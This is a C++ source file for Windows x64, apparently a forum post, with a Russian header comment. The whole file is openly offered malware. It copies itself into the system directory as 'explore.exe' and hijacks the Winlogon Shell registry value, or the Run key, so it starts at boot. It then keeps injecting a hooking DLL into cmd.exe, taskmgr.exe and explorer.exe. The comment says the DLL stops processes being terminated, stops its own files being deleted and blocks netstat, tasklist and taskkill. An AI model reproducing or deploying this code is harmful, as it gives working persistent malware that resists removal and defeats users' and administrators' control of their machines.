/*
Хай всем, ловите перехват функций в x64 методом сплайсинга, 
записывая вместо первого байта инструкцию int 3 и устанавливая свой обработчик исключений.

Перехват TerminateProcess, запрещая терминаторить любые процессы, запрещение удаления файлов с именами explorer.exe, 
Injector.exe с помощью нагибания DeleteFileW. Перехват CreateProcessW, 
благодаря чему - запрет на запуск netstat, tasklist, taskkill из cmd.exe и explorer.exe - Win + R. 

*/


#include <windows.h>
#include <tlhelp32.h>



#pragma comment(linker, "/subsystem:windows")
#pragma comment(linker, "/entry:main")
#pragma comment(linker, "/MACHINE:x64")

DWORD FindProcessId(const LPCTSTR processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(processesSnapshot, &processInfo);
    if (strcmp(processName, processInfo.szExeFile) == 0)
    {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (strcmp(processName, processInfo.szExeFile) == 0)
        {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

BOOL InjectRemoteThread(DWORD ProcessID, LPCTSTR DLL_NAME)
{
    HANDLE RemoteProc;
    char buf[50] = { 0 };
    LPVOID MemAlloc;
    LPVOID LoadLibAddress;

    if (!ProcessID)
    {
        return 0;
    }
     RemoteProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |  PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,  FALSE, ProcessID);
    if (!RemoteProc)
    {
        return 0;
    }
    LoadLibAddress = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    MemAlloc = (LPVOID)VirtualAllocEx(RemoteProc, NULL, strlen(DLL_NAME) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(RemoteProc, (LPVOID)MemAlloc, DLL_NAME, strlen(DLL_NAME) + 1, NULL);
    CreateRemoteThread(RemoteProc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddress, (LPVOID)MemAlloc, NULL, NULL);

    CloseHandle(RemoteProc);
    VirtualFreeEx(RemoteProc, (LPVOID)MemAlloc, 0, MEM_RELEASE | MEM_DECOMMIT);
    return 1;
}


bool Install()
{
    char InstallName[] = "explore.exe";
    char SysPath[MAX_PATH];
    char CurrPath[MAX_PATH];
    char DLLName[] = "InterceptionDLL.dll";
    GetModuleFileName(0, CurrPath, MAX_PATH);
    HKEY hKey;
     if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows  NT\\CurrentVersion\\Winlogon", 0, KEY_ALL_ACCESS, &hKey) ==  ERROR_SUCCESS)
    {
        GetSystemDirectory(SysPath, MAX_PATH);
        wsprintf(SysPath, "%s\\%s", SysPath, InstallName);
        DeleteFile(SysPath);
        CopyFile(CurrPath, SysPath, 0);
        char ShellReg[MAX_PATH];
        wsprintf(ShellReg, "explorer.exe, %s", InstallName);
        RegSetValueEx(hKey, "Shell", 0, REG_SZ, reinterpret_cast<BYTE*>(ShellReg), lstrlen(ShellReg));
        RegFlushKey(hKey);
        RegCloseKey(hKey);
        GetSystemDirectory(SysPath, MAX_PATH);
        wsprintf(SysPath, "%s\\InterceptionDLL.dll", SysPath);
        DeleteFile(SysPath);
        CopyFile(DLLName, SysPath, 0);
        return true;
    }
    else
    {
        RegCloseKey(hKey);
        RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
        char AppData[MAX_PATH];
        GetEnvironmentVariable("AppData", AppData, MAX_PATH);
        wsprintf(AppData, "%s\\%s", AppData, InstallName);
        DeleteFile(AppData);
        CopyFile(CurrPath, AppData, 0);
        RegSetValueEx(hKey, "Shell", 0, REG_SZ, reinterpret_cast<BYTE*>(AppData), lstrlen(AppData));
        RegFlushKey(hKey);
        RegCloseKey(hKey);
        GetEnvironmentVariable("AppData", AppData, MAX_PATH);
        wsprintf(AppData, "%s\\InterceptionDLL.dll", AppData);
        DeleteFile(AppData);
        CopyFile(DLLName, AppData, 0);
        return true;
    }

}

int WhoIAm()
{
    char SysPath[MAX_PATH];
    char SelfPath[MAX_PATH];
    GetModuleFileName(0, SelfPath, MAX_PATH);
    GetSystemDirectory(SysPath, MAX_PATH);
    wsprintf(SysPath, "%s\\explore.exe", SysPath);
    if (lstrcmpA(SysPath, SelfPath) == 0) return 1; else return 0;
}

int main()
{
    if (WhoIAm() == 0) Install();
    char TempPath[MAX_PATH];
    GetTempPath(MAX_PATH, TempPath);
    lstrcat(TempPath, "InterceptionDLL.dll");
    DeleteFile(TempPath);
    CopyFile("InterceptionDLL.dll", TempPath, 0);
    bool cmd = false;
    bool taskmgr = false;
    bool explorer = false;
    while (1)
    {
        if (FindProcessId("cmd.exe") != 0)
        {
            if (cmd != true)
            {
                cmd = true;
                InjectRemoteThread(FindProcessId("cmd.exe"), TempPath);
            }
        }
        else cmd = false;
        if (FindProcessId("taskmgr.exe") != 0)
        {
            if (taskmgr != true)
            {
                taskmgr = true;
                InjectRemoteThread(FindProcessId("taskmgr.exe"), TempPath);
            }
        }
        else taskmgr = false;
        if (FindProcessId("explorer.exe") != 0)
        {
            if (explorer != true)
            {
                explorer = true;
                InjectRemoteThread(FindProcessId("explorer.exe"), TempPath);
            }
        }
        else explorer = false;
        Sleep(200);
    }
}
